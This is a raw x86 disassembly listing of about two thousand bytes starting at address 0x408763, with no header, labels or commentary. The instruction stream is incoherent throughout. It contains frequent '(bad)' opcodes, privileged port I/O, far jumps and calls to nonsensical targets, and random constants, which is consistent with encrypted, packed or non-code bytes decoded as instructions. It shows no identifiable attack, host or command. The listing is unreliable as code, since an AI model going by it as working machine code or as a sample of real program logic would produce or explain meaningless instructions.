  408763:	jns    0x408729
  408765:	div    DWORD PTR [esi]
  408767:	sbb    ax,0x69be
  40876b:	in     al,0xf8
  40876d:	mov    al,ds:0xcaa28684
  408772:	dec    ecx
  408773:	jno    0x408737
  408775:	hlt    
  408776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408777:	aas    
  408778:	push   edi
  408779:	inc    edx
  40877a:	ret    
  40877b:	inc    ecx
  40877c:	mov    eax,0xd30072d6
  408781:	ds xchg esp,eax
  408783:	pop    esi
  408784:	add    DWORD PTR [eax-0x5a66e170],esi
  40878a:	cmp    BYTE PTR [edi+0x24],ch
  40878d:	loope  0x4087bc
  40878f:	dec    edi
  408790:	mov    edx,0x69221ed1
  408795:	sti    
  408796:	rcr    dl,1
  408798:	xlat   BYTE PTR ds:[ebx]
  408799:	and    ebp,ecx
  40879b:	retf   0x2f37
  40879e:	xchg   ebx,eax
  40879f:	adc    DWORD PTR [edx-0x51],edx
  4087a2:	int3   
  4087a3:	imul   esi,eax,0x3ce94e06
  4087a9:	fadd   QWORD PTR [ebx+0x19629f82]
  4087af:	dec    eax
  4087b0:	mov    cl,0xc
  4087b2:	xchg   DWORD PTR [esi+0x555ae640],edi
  4087b8:	and    DWORD PTR [esi-0xb],edx
  4087bb:	jns    0x4087cf
  4087bd:	jnp    0x4087f5
  4087bf:	js     0x408794
  4087c1:	and    BYTE PTR [ecx],bh
  4087c3:	aam    0xc9
  4087c5:	in     eax,dx
  4087c6:	or     ebx,esi
  4087c8:	imul   edi,DWORD PTR [ebx],0xffffffd0
  4087cb:	mov    esp,0x4568c555
  4087d0:	test   esp,edi
  4087d2:	xchg   ebp,eax
  4087d3:	xor    edi,esp
  4087d5:	pop    eax
  4087d6:	inc    esp
  4087d7:	jmp    0x6685:0x79eec216
  4087de:	jle    0x40884b
  4087e0:	in     al,dx
  4087e1:	jbe    0x408823
  4087e3:	sub    esp,DWORD PTR [ebp+0x2e85cbd2]
  4087e9:	dec    ecx
  4087ea:	mov    eax,ds:0x7d528ba9
  4087ef:	jle    0x4087e8
  4087f1:	cmp    ah,BYTE PTR ds:[edx]
  4087f4:	push   es
  4087f5:	pop    edi
  4087f6:	in     eax,dx
  4087f7:	xor    esp,DWORD PTR [edx]
  4087f9:	mov    esi,0xc0aab056
  4087fe:	inc    ecx
  4087ff:	stc    
  408800:	das    
  408801:	and    bl,BYTE PTR [ecx-0x69]
  408804:	(bad)  
  408805:	sbb    al,0x8e
  408807:	sub    ah,BYTE PTR [ebp-0x1e735b9c]
  40880d:	or     ch,BYTE PTR [ebp+0x3d433c96]
  408813:	xor    BYTE PTR cs:[edx-0x48f10a92],cl
  40881a:	addr16 dec ebx
  40881c:	jl     0x4087ba
  40881e:	addr16 xchg esi,edx
  408821:	push   edi
  408822:	xor    al,0x55
  408824:	mov    cl,ah
  408826:	jns    0x408845
  408828:	xor    al,0x9f
  40882a:	(bad)  
  40882b:	sub    edx,DWORD PTR [edi+0x72ca60a8]
  408831:	scas   al,BYTE PTR es:[edi]
  408832:	mov    eax,0x452cf794
  408837:	lock out 0x54,eax
  40883a:	push   0xffffffb1
  40883c:	sbb    BYTE PTR [edx+0x36d7fedd],al
  408842:	jmp    0x5722:0xdfa3f1c5
  408849:	mov    cl,0xe5
  40884b:	std    
  40884c:	fsubp  st(4),st
  40884e:	fdivr  st,st(4)
  408850:	pop    edi
  408851:	mov    ds:0x309edd6d,eax
  408856:	js     0x4088ae
  408858:	jecxz  0x408860
  40885a:	retf   0x9820
  40885d:	(bad)  
  40885e:	cmp    dh,BYTE PTR [edx-0x4841b53e]
  408864:	cmp    al,0x62
  408866:	test   BYTE PTR [eax-0x320ee3ae],cl
  40886c:	xor    eax,0xc1f61a7e
  408871:	jnp    0x408812
  408873:	push   edx
  408874:	test   BYTE PTR ds:0xddfca219,dl
  40887a:	jg     0x4088f4
  40887c:	pop    es
  40887d:	sbb    eax,0x9c6074a0
  408882:	iret   
  408883:	cmp    BYTE PTR [esi+0x1fe7c616],bl
  408889:	add    eax,0x51016ac4
  40888e:	int3   
  40888f:	push   cs
  408890:	sub    dh,BYTE PTR [edx]
  408892:	arpl   WORD PTR [edi-0x59ae571d],di
  408898:	cmp    DWORD PTR [esi+0x1e],edi
  40889b:	fldenv [eax]
  40889d:	sbb    DWORD PTR [edi-0x35935d90],0xffffff9e
  4088a4:	imul   esi,ebp,0xfffffff9
  4088a7:	mov    esi,0xb61eb929
  4088ac:	inc    edi
  4088ad:	lods   al,BYTE PTR ds:[esi]
  4088ae:	in     al,dx
  4088af:	xor    esp,ebx
  4088b1:	inc    edx
  4088b2:	stos   BYTE PTR es:[edi],al
  4088b3:	sbb    DWORD PTR [eax],esi
  4088b5:	jg     0x4088b1
  4088b7:	test   eax,0xa35c876c
  4088bc:	jnp    0x40887b
  4088be:	cli    
  4088bf:	sahf   
  4088c0:	dec    edx
  4088c1:	sub    cl,bl
  4088c3:	or     edi,DWORD PTR [esi]
  4088c5:	dec    eax
  4088c6:	cmp    al,0x27
  4088c8:	lods   al,BYTE PTR ds:[esi]
  4088c9:	dec    ecx
  4088ca:	int3   
  4088cb:	inc    ebp
  4088cc:	pop    edi
  4088cd:	pusha  
  4088ce:	push   edx
  4088cf:	neg    BYTE PTR gs:[esp+ebx*1]
  4088d3:	and    esi,DWORD PTR [eax]
  4088d5:	or     BYTE PTR [esi-0x116562ce],dl
  4088db:	out    0x74,al
  4088dd:	jmp    0x601b:0xe11a5b9e
  4088e4:	(bad)  
  4088e5:	xchg   esp,eax
  4088e6:	pusha  
  4088e7:	test   DWORD PTR [edx],esp
  4088e9:	mov    bl,0x60
  4088eb:	mov    DWORD PTR [eax+0x4f7f012b],edi
  4088f1:	adc    ch,ch
  4088f3:	loope  0x408892
  4088f5:	loope  0x408931
  4088f7:	je     0x4088ed
  4088f9:	(bad)  
  4088fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088fb:	adc    DWORD PTR [edi],0x55
  4088fe:	push   ss
  4088ff:	cli    
  408900:	int3   
  408901:	mov    ebp,0x1852526f
  408906:	jae    0x40888f
  408908:	jne    0x408893
  40890a:	jmp    0x3758:0x63915066
  408911:	shl    DWORD PTR fs:[esi],1
  408914:	push   edx
  408915:	arpl   bx,si
  408917:	out    dx,eax
  408918:	call   0x205a86fe
  40891d:	push   esp
  40891e:	stc    
  40891f:	mov    bl,0x9c
  408921:	stos   BYTE PTR es:[edi],al
  408922:	mov    eax,0x6a096237
  408927:	pusha  
  408928:	daa    
  408929:	mov    eax,0xc5275e9c
  40892e:	je     0x4089a7
  408930:	add    ebp,DWORD PTR [ecx-0xae85900]
  408936:	std    
  408937:	ins    DWORD PTR es:[edi],dx
  408938:	adc    al,0xd0
  40893a:	faddp  st(4),st
  40893c:	jg     0x408975
  40893e:	xchg   esp,eax
  40893f:	sub    dh,BYTE PTR ds:0x190bb502
  408945:	xor    ebx,ecx
  408947:	dec    ebp
  408948:	nop
  408949:	or     eax,0x3cdc6808
  40894e:	xor    al,0x27
  408950:	clc    
  408951:	mov    eax,ds:0x75197a8f
  408956:	add    eax,0x49472f55
  40895b:	dec    eax
  40895c:	xchg   ebx,eax
  40895d:	xchg   DWORD PTR [ebp+0x7a16d6e5],esp
  408963:	xchg   esi,eax
  408964:	cmp    BYTE PTR [eax-0x18841218],ch
  40896a:	dec    ecx
  40896b:	push   es
  40896c:	dec    esi
  40896d:	je     0x408974
  40896f:	ss out 0x2c,eax
  408972:	(bad)  [ebx]
  408974:	push   ds
  408975:	jmp    0x53fa5142
  40897a:	or     eax,0x5e38e431
  40897f:	inc    ebx
  408980:	pop    ebp
  408981:	lock cmp eax,0xce8f9602
  408987:	pop    edi
  408988:	xchg   esp,eax
  408989:	mov    cl,0x47
  40898b:	mov    dh,bh
  40898d:	push   0x2c55a4bb
  408992:	xor    eax,0xf59a8c01
  408997:	popa   
  408998:	ds mov dh,0xb3
  40899b:	ins    DWORD PTR es:[edi],dx
  40899c:	dec    ecx
  40899d:	cmp    BYTE PTR [esi-0x1280c254],dl
  4089a3:	mov    esi,0x4401a26e
  4089a8:	pop    esp
  4089a9:	push   ss
  4089aa:	sbb    eax,0xfa92b5ce
  4089af:	mov    ebx,0x8ec13c6f
  4089b4:	mov    dh,0xa4
  4089b6:	dec    esi
  4089b7:	xor    al,0x9a
  4089b9:	clc    
  4089ba:	call   0x21345881
  4089bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089c0:	fcomp  DWORD PTR [esi]
  4089c2:	and    eax,0xa8493fdb
  4089c7:	retf   0x1f13
  4089ca:	pop    ss
  4089cb:	ret    0x237b
  4089ce:	cld    
  4089cf:	leave  
  4089d0:	mov    edx,edx
  4089d2:	jno    0x408a02
  4089d4:	or     al,0xd3
  4089d6:	inc    ebp
  4089d7:	add    al,0x5c
  4089d9:	dec    esi
  4089da:	or     esp,ecx
  4089dc:	in     eax,0x51
  4089de:	push   cs
  4089df:	jge    0x408978
  4089e1:	push   ecx
  4089e2:	retf   0x68ac
  4089e5:	jbe    0x408a65
  4089e7:	punpckhwd mm1,QWORD PTR ds:0x6b546f1
  4089ee:	mov    dh,0x52
  4089f0:	sar    DWORD PTR [edx+0x3b],cl
  4089f3:	sbb    DWORD PTR [ecx],0xffffffaa
  4089f6:	ret    
  4089f7:	mov    esi,0xbb39a80f
  4089fc:	mov    ch,0x9a
  4089fe:	xchg   esi,eax
  4089ff:	aaa    
  408a00:	aas    
  408a01:	into   
  408a02:	clc    
  408a03:	rol    DWORD PTR [ebx+0x598ba1f1],1
  408a09:	scas   al,BYTE PTR es:[edi]
  408a0a:	sub    eax,0xc932a368
  408a0f:	adc    al,BYTE PTR [ebx+0x73462cc5]
  408a15:	mov    esi,0x6056b67d
  408a1a:	sub    ebp,ebp
  408a1c:	mov    eax,0x3150ef5a
  408a21:	push   ebx
  408a22:	sbb    bh,dh
  408a24:	test   al,0xeb
  408a26:	add    eax,0x258c99cf
  408a2b:	ins    BYTE PTR es:[edi],dx
  408a2c:	inc    edx
  408a2d:	xor    al,bh
  408a2f:	mov    ds:0xb94eb57f,al
  408a34:	or     DWORD PTR [ebx-0x7e],esp
  408a37:	in     al,0xc7
  408a39:	(bad)  [ecx]
  408a3b:	mov    dl,0xbd
  408a3d:	inc    esi
  408a3e:	mov    BYTE PTR [ebx-0x6e],al
  408a41:	cmc    
  408a42:	aad    0x75
  408a44:	hlt    
  408a45:	sbb    DWORD PTR [edx+0x23],0xfffffffa
  408a49:	mov    ch,0x3
  408a4b:	retf   
  408a4c:	lods   al,BYTE PTR ds:[esi]
  408a4d:	adc    DWORD PTR [edi],esi
  408a4f:	or     DWORD PTR [ecx-0x3a],eax
  408a52:	gs clc 
  408a54:	test   DWORD PTR [ebp+0x53],0xec69d183
  408a5b:	xlat   BYTE PTR ds:[ebx]
  408a5c:	xor    DWORD PTR [edi+0x35],eax
  408a5f:	jbe    0x408a4a
  408a61:	je     0x408a9a
  408a63:	or     ebp,DWORD PTR [edx+0x7]
  408a66:	lods   eax,DWORD PTR ds:[esi]
  408a67:	fcomp  DWORD PTR [eax-0x32]
  408a6a:	sub    eax,0x9fccbd3
  408a6f:	push   ss
  408a70:	lock in al,dx
  408a72:	mov    WORD PTR [ecx+0x38d455c1],fs
  408a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a79:	pop    ss
  408a7a:	sbb    DWORD PTR [ebx+0x62],edx
  408a7d:	jg     0x408a51
  408a7f:	hlt    
  408a80:	mov    ebx,0x3da78b76
  408a85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a86:	pop    esi
  408a87:	mov    al,0xb3
  408a89:	lods   eax,DWORD PTR ds:[esi]
  408a8a:	rcr    ebp,0x7c
  408a8d:	mov    bl,0xe6
  408a8f:	cwde   
  408a90:	ins    DWORD PTR es:[edi],dx
  408a91:	mov    eax,DWORD PTR [eax-0x44]
  408a94:	add    al,0x21
  408a96:	push   ebx
  408a97:	mov    ebp,0xb6c44868
  408a9c:	mov    WORD PTR [esi-0x7e],ss
  408a9f:	and    DWORD PTR [ebx+0x6f],0xffffff8f
  408aa3:	push   ebp
  408aa4:	xchg   ecx,eax
  408aa5:	and    eax,0xd9ba63ff
  408aaa:	adc    esp,DWORD PTR [ebx+0x23]
  408aad:	mov    al,ds:0x78c3f12
  408ab2:	adc    ch,BYTE PTR [ebx-0x4a]
  408ab5:	js     0x408b2f
  408ab7:	fistp  WORD PTR [ebx-0x598fbf1c]
  408abd:	sbb    BYTE PTR [ecx+edi*8+0x53c73a19],ah
  408ac4:	aam    0x8b
  408ac6:	fcmovb st,st(4)
  408ac8:	mov    dh,0x37
  408aca:	sub    BYTE PTR [ebp-0x37cf98e2],bl
  408ad0:	mov    edx,0x8a8213da
  408ad5:	int3   
  408ad6:	repnz push esp
  408ad8:	or     al,0xfc
  408ada:	cmp    al,0xb
  408adc:	xchg   BYTE PTR [edi-0x51],dl
  408adf:	dec    ecx
  408ae0:	sub    al,0x67
  408ae2:	mov    edi,0xb6611b71
  408ae7:	and    eax,0x36a37f34
  408aec:	ins    DWORD PTR es:[edi],dx
  408aed:	dec    ecx
  408aee:	jmp    0x408b03
  408af0:	imul   esp,DWORD PTR [ecx+0x2a4b2d62],0x68
  408af7:	loopne 0x408ae1
  408af9:	mov    ebp,0xba5d6823
  408afe:	inc    eax
  408aff:	fsub   QWORD PTR [edi-0x2d]
  408b02:	ds in  eax,0x5c
  408b05:	inc    esi
  408b06:	sub    DWORD PTR [ebx-0x58],esp
  408b09:	in     eax,dx
  408b0a:	mov    ds:0x2b736188,al
  408b0f:	xchg   ecx,eax
  408b10:	clc    
  408b11:	dec    esp
  408b12:	outs   dx,DWORD PTR ds:[esi]
  408b13:	pop    edx
  408b14:	pop    es
  408b15:	xchg   edi,eax
  408b16:	int    0x94
  408b18:	aaa    
  408b19:	addr16 push ebp
  408b1b:	addr16 sub al,0x6
  408b1e:	mov    al,0x51
  408b20:	js     0x408b6c
  408b22:	test   DWORD PTR [edi],0x4c463a4b
  408b28:	arpl   WORD PTR [eax+0x42],bx
  408b2b:	or     al,dl
  408b2d:	pop    ss
  408b2e:	push   ebx
  408b2f:	inc    ebp
  408b30:	jg     0x408b62
  408b32:	(bad)  
  408b33:	mov    al,ds:0xe0e6f367
  408b38:	stc    
  408b39:	rcr    DWORD PTR [esi+0x50070d68],cl
  408b3f:	or     DWORD PTR [ebx-0xd],ebp
  408b42:	rcl    BYTE PTR [ecx],1
  408b44:	and    BYTE PTR [eax],al
  408b46:	shl    cl,0xa2
  408b49:	mov    eax,DWORD PTR [ebx+0x4646b53d]
  408b4f:	jmp    0xdfa73299
  408b54:	rcr    cl,1
  408b56:	fld    st(5)
  408b58:	pop    ss
  408b59:	rol    DWORD PTR [esi],0x1c
  408b5c:	and    cl,al
  408b5e:	dec    esi
  408b5f:	das    
  408b60:	dec    ebx
  408b61:	cmp    DWORD PTR [edi-0x51],0xd3ecd545
  408b68:	setnp  BYTE PTR [edx+0x14da9550]
  408b6f:	sbb    BYTE PTR [edi+0x67516796],bl
  408b75:	mov    DWORD PTR [eax],edi
  408b77:	mov    ah,0xb6
  408b79:	dec    esi
  408b7a:	int3   
  408b7b:	sbb    al,0xd4
  408b7d:	int    0xb2
  408b7f:	xor    BYTE PTR [edi+0x13e65ad7],bh
  408b85:	and    DWORD PTR [ebx+0x26d33c4f],ebp
  408b8b:	clc    
  408b8c:	add    bl,cl
  408b8e:	data16 mov dh,0x43
  408b91:	ret    
  408b92:	bound  ebx,QWORD PTR [esi-0x62]
  408b95:	inc    esi
  408b96:	mov    ebx,0x20c2148a
  408b9b:	retf   
  408b9c:	or     DWORD PTR [eax],edi
  408b9e:	addr16 mov edi,0xb67c974d
  408ba4:	cmp    DWORD PTR ds:0xbb7e01b5,edx
  408baa:	mov    dh,0x44
  408bac:	aas    
  408bad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bae:	adc    al,0x9a
  408bb0:	add    BYTE PTR [ecx+0x43fa2381],0xd5
  408bb7:	mov    edx,0x98211036
  408bbc:	jl     0x408c05
  408bbe:	pop    ecx
  408bbf:	jmp    0x408c09
  408bc1:	or     edx,esp
  408bc3:	push   ds
  408bc4:	xchg   esp,eax
  408bc5:	pop    es
  408bc6:	inc    ecx
  408bc7:	fdiv   st,st(5)
  408bc9:	add    ah,BYTE PTR [ebx+0x7e]
  408bcc:	test   bl,0x1e
  408bcf:	mov    edx,0x7c93c1da
  408bd4:	(bad)  
  408bd5:	jg     0x408b8c
  408bd7:	ds sbb ax,0xf925
  408bdc:	and    esi,esp
  408bde:	adc    bl,BYTE PTR [ebx]
  408be0:	jl     0x408bb1
  408be2:	rol    DWORD PTR [eax-0x364fac0],1
  408be8:	mov    ds:0x8a701a6d,eax
  408bed:	stos   BYTE PTR es:[edi],al
  408bee:	dec    edx
  408bef:	lods   al,BYTE PTR ds:[esi]
  408bf0:	inc    esp
  408bf1:	mov    ds:0xb5d130d1,eax
  408bf6:	mov    DWORD PTR [ebp-0xe],edx
  408bf9:	dec    esi
  408bfa:	retw   
  408bfc:	dec    ebx
  408bfd:	mov    WORD PTR [edx-0x6e46057d],cs
  408c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c04:	gs cmp eax,0x14813045
  408c0a:	inc    eax
  408c0b:	rcr    ebx,1
  408c0d:	cmp    bh,BYTE PTR [edi-0x42]
  408c10:	mov    ch,0x46
  408c12:	and    BYTE PTR cs:[ebp-0x4],al
  408c16:	ret    0xaf56
  408c19:	and    BYTE PTR [edx],bh
  408c1b:	xor    bl,BYTE PTR [ebx+eax*4]
  408c1e:	add    BYTE PTR [esi],bh
  408c20:	std    
  408c21:	clc    
  408c22:	outs   dx,DWORD PTR ds:[esi]
  408c23:	xor    cl,ah
  408c25:	pushf  
  408c26:	mov    ebx,DWORD PTR [edi+ecx*4]
  408c29:	or     BYTE PTR [ecx],0xdb
  408c2c:	push   edx
  408c2d:	pop    ecx
  408c2e:	fisubr DWORD PTR [esp+ebp*1-0x5536756c]
  408c35:	adc    eax,0x5391a6c7
  408c3a:	iret   
  408c3b:	xchg   ebx,eax
  408c3c:	push   eax
  408c3d:	(bad)  
  408c3f:	je     0x408bd4
  408c41:	push   es
  408c42:	sar    DWORD PTR [ecx],0xb3
  408c45:	lahf   
  408c46:	cs retf 
  408c48:	push   eax
  408c49:	mov    al,0xf3
  408c4b:	leave  
  408c4c:	jecxz  0x408bfe
  408c4e:	cwde   
  408c4f:	adc    al,0x20
  408c51:	fild   WORD PTR [esi-0x5d78ccd3]
  408c57:	cmp    al,0xe1
  408c59:	pop    ebx
  408c5a:	push   es
  408c5b:	mov    ds:0x45270110,al
  408c60:	jns    0x408c01
  408c62:	xchg   esi,eax
  408c63:	out    0x6b,al
  408c65:	out    dx,al
  408c66:	cwde   
  408c67:	inc    esi
  408c68:	sar    DWORD PTR [ebx],cl
  408c6a:	outs   dx,BYTE PTR ds:[esi]
  408c6b:	aad    0x39
  408c6d:	lods   al,BYTE PTR ds:[esi]
  408c6e:	dec    edi
  408c6f:	add    DWORD PTR [edi-0x39],edx
  408c72:	pop    ds
  408c73:	hlt    
  408c74:	jbe    0x408cee
  408c76:	cmp    BYTE PTR [ebp+0x6259285b],ch
  408c7c:	rcl    BYTE PTR [esi+ebx*2],0xb1
  408c80:	or     edi,DWORD PTR cs:[edx]
  408c83:	pop    edx
  408c84:	outs   dx,BYTE PTR ds:[esi]
  408c85:	js     0x408c92
  408c87:	call   0x83dc:0xc3fdf529
  408c8e:	ficom  DWORD PTR ds:0x7026c64f
  408c94:	cmp    esi,eax
  408c96:	dec    ebp
  408c97:	mov    bh,0x14
  408c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c9a:	jge    0x408cbb
  408c9c:	aas    
  408c9d:	(bad)  
  408c9f:	cwde   
  408ca0:	popf   
  408ca1:	popa   
  408ca2:	xor    DWORD PTR [ebx+edi*1+0x41022f8b],ecx
  408ca9:	loop   0x408c45
  408cab:	mov    ebx,DWORD PTR [esi]
  408cad:	xor    bh,BYTE PTR [ebx+edx*2-0x62]
  408cb1:	pop    edi
  408cb2:	xlat   BYTE PTR ds:[ebx]
  408cb3:	popf   
  408cb4:	gs mov ch,0x66
  408cb7:	mov    ds:0x5ea8ef56,al
  408cbc:	rcl    DWORD PTR [edx-0x7668b333],0x7a
  408cc3:	mov    eax,ds:0x284426d4
  408cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cc9:	lea    ebp,[ecx]
  408ccb:	cmp    esi,DWORD PTR [esi-0x18219c9d]
  408cd1:	nop
  408cd2:	stos   DWORD PTR es:[edi],eax
  408cd3:	inc    ebp
  408cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cd5:	imul   ebp,DWORD PTR [ebx+esi*8],0x2d6f309b
  408cdc:	imul   esp,DWORD PTR ss:[ebx+0xa],0xffffffb5
  408ce1:	je     0x408d34
  408ce3:	cmc    
  408ce4:	mov    dl,dh
  408ce6:	sbb    ah,BYTE PTR [ecx+eiz*2-0x76]
  408cea:	mov    dh,0xfd
  408cec:	dec    edi
  408ced:	push   0x7a
  408cef:	push   ebx
  408cf0:	xor    eax,0x2ca3d7e2
  408cf5:	(bad)  
  408cf6:	mov    edx,0xf18f11c2
  408cfb:	sbb    bh,cl
  408cfd:	(bad)  
  408cfe:	out    dx,eax
  408cff:	add    eax,0x6c724d49
  408d04:	xchg   ecx,eax
  408d05:	rol    BYTE PTR [eax],1
  408d07:	mov    esp,0xa19e8166
  408d0c:	fild   WORD PTR [edx-0x3b3eeef1]
  408d12:	or     BYTE PTR [edx+0x22],ch
  408d15:	cs inc esi
  408d17:	stc    
  408d18:	gs push ecx
  408d1a:	cwde   
  408d1b:	and    eax,0x8805cd52
  408d20:	pop    ss
  408d21:	pushf  
  408d22:	fcmovnu st,st(2)
  408d24:	mov    ds:0xc418e919,al
  408d29:	pop    es
  408d2a:	sub    cl,BYTE PTR [edi]
  408d2c:	and    edx,ebx
  408d2e:	adc    BYTE PTR [esi-0x61],cl
  408d31:	nop
  408d32:	aam    0x83
  408d34:	push   edi
  408d35:	mov    ebp,0x1188afde
  408d3a:	je     0x408d0d
  408d3c:	pop    ds
  408d3d:	mov    ebx,DWORD PTR [edi-0x6f5ea5c3]
  408d43:	adc    edi,DWORD PTR [edx-0x746fc265]
  408d49:	dec    esp
  408d4a:	add    dh,BYTE PTR [edx-0x565fedae]
  408d50:	sar    bl,1
  408d52:	mov    al,BYTE PTR es:[edx]
  408d55:	xor    BYTE PTR ds:0xdb4d7a3,dl
  408d5b:	mov    ds:0xd9e0fd16,al
  408d60:	cmp    BYTE PTR [ebx+0x4],dl
  408d63:	ret    0x242f
  408d66:	hlt    
  408d67:	arpl   sp,si
  408d69:	les    esi,FWORD PTR [edi-0x5ea8d41]
  408d6f:	stos   DWORD PTR es:[edi],eax
  408d70:	xchg   esp,eax
  408d71:	xor    cl,bh
  408d73:	or     edi,0x42
  408d76:	mov    cl,0xa2
  408d78:	mov    eax,0xc35aa830
  408d7d:	jmp    0x408df4
  408d7f:	xchg   esp,eax
  408d80:	mov    ds:0xc4ca81f5,al
  408d85:	jae    0x408d3e
  408d87:	cs icebp 
  408d89:	or     eax,0xe7378366
  408d8e:	push   es
  408d8f:	mov    ebp,0x4cab1058
  408d94:	fidiv  DWORD PTR [esi]
  408d96:	mov    al,ds:0x2d5ca178
  408d9b:	outs   dx,BYTE PTR ds:[esi]
  408d9c:	lea    esi,[esi]
  408d9e:	sub    eax,0xac89a0f6
  408da3:	(bad)
  408da6:	stc    
  408da7:	xchg   esp,eax
  408da8:	popf   
  408da9:	fsubp  st(4),st
  408dab:	ficomp WORD PTR [ecx]
  408dad:	mov    edi,0x468e9cb
  408db2:	sub    al,0x75
  408db4:	int3   
  408db5:	iret   
  408db6:	stos   BYTE PTR es:[edi],al
  408db7:	or     DWORD PTR [edx+0xb59ede],0x7c
  408dbe:	or     ebx,DWORD PTR [eax-0xa]
  408dc1:	push   ebx
  408dc2:	and    ebx,DWORD PTR [ecx+0x3d]
  408dc5:	and    al,0x31
  408dc7:	push   esp
  408dc8:	bound  ebx,QWORD PTR [edi+ebx*4+0x12]
  408dcc:	xchg   edx,eax
  408dcd:	(bad)  
  408dcf:	xchg   ecx,eax
  408dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dd1:	addr16 dec edi
  408dd3:	dec    edi
  408dd4:	jecxz  0x408dc1
  408dd6:	jno    0x408da5
  408dd8:	inc    eax
  408dd9:	add    eax,0x8cf8dd3
  408dde:	sbb    DWORD PTR [eax+eax*8+0x3af7a5d4],edx
  408de5:	sbb    al,0x2c
  408de7:	cli    
  408de8:	iret   
  408de9:	sub    eax,0xa4ded33e
  408dee:	xchg   edi,eax
  408def:	(bad)  
  408df0:	cdq    
  408df1:	add    dl,dh
  408df3:	dec    ebx
  408df4:	mov    ds:0x7e5f6f67,al
  408dfa:	dec    ecx
  408dfb:	fld    DWORD PTR [ecx-0x22]
  408dfe:	or     DWORD PTR [ecx-0x4d0ae38d],ebx
  408e04:	push   edx
  408e05:	(bad)  
  408e06:	outs   dx,BYTE PTR ds:[esi]
  408e07:	push   ebp
  408e08:	fisubr WORD PTR [esi]
  408e0a:	mov    ebx,0x970a10ef
  408e0f:	out    dx,eax
  408e10:	(bad)  
  408e11:	adc    ecx,DWORD PTR [edx-0x15]
  408e14:	dec    esp
  408e15:	xchg   esp,eax
  408e16:	icebp  
  408e17:	out    dx,al
  408e18:	pop    edx
  408e19:	daa    
  408e1a:	push   ds
  408e1b:	or     esi,DWORD PTR [ecx+0x5720734f]
  408e21:	jb     0x408dfb
  408e23:	ss dec ebp
  408e25:	out    dx,al
  408e26:	jmp    0x5fe72078
  408e2b:	inc    edi
  408e2c:	cs pop es
  408e2e:	hlt    
  408e2f:	test   eax,0xe78498b9
  408e34:	dec    ebx
  408e35:	les    esi,FWORD PTR [ebx-0x4bcbf38b]
  408e3b:	shr    eax,cl
  408e3d:	cld    
  408e3e:	mov    eax,ds:0xb186343e
  408e43:	push   es
  408e44:	xor    ebx,DWORD PTR [edx+0x30]
  408e47:	lock mov dl,0x73
  408e4a:	cs out dx,eax
  408e4c:	test   eax,0x1348f54d
  408e51:	inc    edi
  408e52:	jb     0x408ecc
  408e54:	cdq    
  408e55:	es pop edx
  408e57:	jbe    0x408e18
  408e59:	mov    esp,0x70f0f82f
  408e5e:	mov    ds:0x647cdf32,al
  408e63:	ficom  WORD PTR [edx+0x6b649345]
  408e69:	or     esp,DWORD PTR [edi-0x1ba7c3e7]
  408e6f:	cli    
  408e70:	push   edi
  408e71:	jmp    0xc2bbf445
  408e76:	(bad)  
  408e77:	popa   
  408e78:	ror    BYTE PTR [eax+0x12e5bc80],cl
  408e7e:	xlat   BYTE PTR ds:[ebx]
  408e7f:	ss daa 
  408e81:	outs   dx,DWORD PTR ds:[esi]
  408e82:	ins    DWORD PTR es:[edi],dx
  408e83:	sub    esi,DWORD PTR [edi-0x49815fb6]
  408e89:	shl    BYTE PTR [edi],cl
  408e8b:	in     al,dx
  408e8c:	int    0x3e
  408e8e:	jmp    DWORD PTR [esi]
  408e90:	(bad)  
  408e91:	dec    edi
  408e92:	outs   dx,DWORD PTR ds:[esi]
  408e93:	loopne 0x408ef4
  408e95:	and    al,0xe
  408e97:	scas   eax,DWORD PTR es:[edi]
  408e98:	dec    edx
  408e99:	push   edx
  408e9a:	call   0x6b90:0x82ac267a
  408ea1:	jnp    0x408e78
  408ea3:	test   al,0x16
  408ea5:	cmp    DWORD PTR [eax],esp
  408ea7:	cmp    ah,BYTE PTR [edi+0x20510e01]
  408ead:	sbb    al,0xac
  408eaf:	jnp    0x408ef1
  408eb1:	add    BYTE PTR [esi+0x7f881f12],dl
  408eb7:	fdivr  DWORD PTR [eax-0xb8e8dda]
  408ebd:	int3   
  408ebe:	pusha  
  408ebf:	aad    0xb5
  408ec1:	scas   eax,DWORD PTR es:[edi]
  408ec2:	retf   
  408ec3:	dec    ebx
  408ec4:	retf   0xc952
  408ec7:	cmp    eax,0xe972219e
  408ecc:	mov    ebp,DWORD PTR [esi+0x715ac5b9]
  408ed2:	mov    ah,0xa8
  408ed4:	fnstsw WORD PTR [ebp-0x18]
  408ed7:	xchg   esi,eax
  408ed8:	xlat   BYTE PTR ds:[ebx]
  408ed9:	jmp    0xe27a5789
  408ede:	jge    0x408f52
  408ee0:	mov    eax,ds:0xc289a3d7
  408ee5:	sar    BYTE PTR [eax],0xfa
  408ee8:	inc    ebx
  408ee9:	mov    eax,ds:0x2e0e89ec
  408eee:	and    esp,0x90f77951
  408ef4:	push   ebx
  408ef5:	rol    dl,cl
  408ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ef8:	les    esp,FWORD PTR [ebx-0x72d7f5c3]
  408efe:	ret    
  408eff:	or     BYTE PTR [eax],al
  408f01:	mov    cl,0x91
  408f03:	es jno 0x408f7c
  408f06:	mov    cl,0x4f
  408f08:	in     al,0xb2
  408f0a:	add    bh,BYTE PTR [eax]
  408f0c:	test   al,0x1
  408f0e:	les    eax,FWORD PTR [edx]
  408f10:	adc    ch,cl
  408f12:	adc    eax,DWORD PTR ds:0xb75861ff
  408f18:	fxam   
  408f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f1b:	aas    
  408f1c:	and    ah,BYTE PTR [edx]
  408f1e:	imul   ecx,DWORD PTR [eax-0x5884784c],0x5a
  408f25:	push   ebp
  408f26:	push   edi
  408f27:	mul    BYTE PTR [ebp*1-0x618d526b]
  408f2e:	lahf   
  408f2f:	dec    ebp
